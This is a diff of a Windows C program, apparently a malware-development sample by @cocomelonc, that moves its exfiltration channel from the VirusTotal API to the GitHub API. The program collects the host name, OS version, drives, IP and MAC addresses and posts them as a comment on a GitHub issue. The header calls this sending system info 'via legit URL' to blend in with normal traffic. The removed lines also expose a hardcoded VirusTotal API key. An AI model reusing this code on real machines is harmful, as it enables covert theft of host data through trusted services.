@@ -1,8 +1,8 @@
 /*
- * hack3.c
- * sending systeminfo via legit URL. VirusTotal API
+ * hack4.c
+ * sending systeminfo via legit URL. GitHub API
  * author @cocomelonc
-*/
+ */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,40 +10,49 @@
 #include <winhttp.h>
 #include <iphlpapi.h>
 
-#define VT_API_KEY "7e7778f8c29bc4b171512caa6cc81af63ed96832f53e7e35fb706dd320ab8c42"
-#define FILE_ID "379698a4f06f18cb3ad388145cf62f47a8da22852a08dd19b3ef48aaedffd3fa"
+#define GITHUB_TOKEN "github_classic_token"
+#define REPO_OWNER "cocomelonc"
+#define REPO_NAME "ejpt"
+#define ISSUE_NUMBER "1"
 
-// send data to VirusTotal using winhttp
-int sendToVT(const char* comment) {
+// send data to GitHub using winhttp
+int sendToGitHub(const char* comment) {
   HINTERNET hSession = NULL;
   HINTERNET hConnect = NULL;
 
   hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
   if (hSession == NULL) {
-    fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
+    fprintf(stderr, "WinHttpOpen. error: %d has occurred.\n", GetLastError());
     return 1;
   }
 
-  hConnect = WinHttpConnect(hSession, L"www.virustotal.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+  hConnect = WinHttpConnect(hSession, L"api.github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
   if (hConnect == NULL) {
     fprintf(stderr, "WinHttpConnect. error: %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hSession);
+    return 1;
   }
 
-  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v3/files/" FILE_ID "/comments", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+  WCHAR url[256];
+  swprintf(url, 256, L"/repos/%s/%s/issues/%s/comments", REPO_OWNER, REPO_NAME, ISSUE_NUMBER);
+  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
   if (hRequest == NULL) {
     fprintf(stderr, "WinHttpOpenRequest. error: %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
+    return 1;
   }
 
   // construct the request body
   char json_body[1024];
-  snprintf(json_body, sizeof(json_body), "{\"data\": {\"type\": \"comment\", \"attributes\": {\"text\": \"%s\"}}}", comment);
+  snprintf(json_body, sizeof(json_body), "{\"body\": \"%s\"}", comment);
 
   // set the headers
-  if (!WinHttpSendRequest(hRequest, L"x-apikey: " VT_API_KEY "\r\nUser-Agent: vt v.1.0\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/json", -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
-    fprintf(stderr, "WinHttpSendRequest. Error %d has occurred.\n", GetLastError());
+  WCHAR headers[512];
+  swprintf(headers, 512, L"Authorization: Bearer %s\r\nUser-Agent: hack-client\r\nContent-Type: application/json\r\n", GITHUB_TOKEN);
+
+  if (!WinHttpSendRequest(hRequest, headers, -1, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0)) {
+    fprintf(stderr, "WinHttpSendRequest. error %d has occurred.\n", GetLastError());
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
@@ -52,13 +61,17 @@ int sendToVT(const char* comment) {
 
   BOOL hResponse = WinHttpReceiveResponse(hRequest, NULL);
   if (!hResponse) {
-    fprintf(stderr, "WinHttpReceiveResponse. Error %d has occurred.\n", GetLastError());
+    fprintf(stderr, "WinHttpReceiveResponse. error %d has occurred.\n", GetLastError());
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    return 1;
   }
 
   DWORD code = 0;
   DWORD codeS = sizeof(code);
   if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &code, &codeS, WINHTTP_NO_HEADER_INDEX)) {
-    if (code == 200) {
+    if (code == 201) {
       printf("comment posted successfully.\n");
     } else {
       printf("failed to post comment. HTTP Status Code: %d\n", code);
@@ -68,7 +81,7 @@ int sendToVT(const char* comment) {
     LPSTR buffer = NULL;
     FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL, error, 0, (LPSTR)&buffer, 0, NULL);
-    printf("WTF? unknown error: %s\n", buffer);
+    printf("unknown error: %s\n", buffer);
     LocalFree(buffer);
   }
 
@@ -76,23 +89,20 @@ int sendToVT(const char* comment) {
   WinHttpCloseHandle(hRequest);
   WinHttpCloseHandle(hSession);
 
-  printf("successfully send info via VT API :)\n");
   return 0;
 }
 
-// get systeminfo and send as comment via VT API logic
+// get systeminfo and send as comment via GitHub API logic
 int main(int argc, char* argv[]) {
-
-  // test posting comment
-//   const char* comment = "meow-meow";
-//   sendToVT(comment);
+  const char* message = "meow-meow";
+  sendToGitHub(message);
 
   char systemInfo[4096];
 
   // Get host name
   CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
   DWORD size = sizeof(hostName) / sizeof(hostName[0]);
-  GetComputerNameA(hostName, &size);  // Use GetComputerNameA for CHAR
+  GetComputerNameA(hostName, &size);
 
   // Get OS version
   OSVERSIONINFO osVersion;
@@ -107,11 +117,11 @@ int main(int argc, char* argv[]) {
   DWORD drives = GetLogicalDrives();
 
   // Get IP address
-  IP_ADAPTER_INFO adapterInfo[16];  // Assuming there are no more than 16 adapters
+  IP_ADAPTER_INFO adapterInfo[16];
   DWORD adapterInfoSize = sizeof(adapterInfo);
   if (GetAdaptersInfo(adapterInfo, &adapterInfoSize) != ERROR_SUCCESS) {
     printf("GetAdaptersInfo failed. error: %d has occurred.\n", GetLastError());
-    return false;
+    return 1;
   }
 
   snprintf(systemInfo, sizeof(systemInfo),
@@ -132,7 +142,7 @@ int main(int argc, char* argv[]) {
     "Adapter Name: %s, "
     "IP Address: %s, "
     "Subnet Mask: %s, "
-    "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X",
+    "MAC Address: %02X-%02X-%02X-%02X-%02X-%02X", 
     adapter->AdapterName,
     adapter->IpAddressList.IpAddress.String,
     adapter->IpAddressList.IpMask.String,
@@ -140,7 +150,7 @@ int main(int argc, char* argv[]) {
     adapter->Address[3], adapter->Address[4], adapter->Address[5]);
   }
 
-  int result = sendToVT(systemInfo);
+  int result = sendToGitHub(systemInfo);
 
   if (result == 0) {
     printf("ok =^..^=\n");
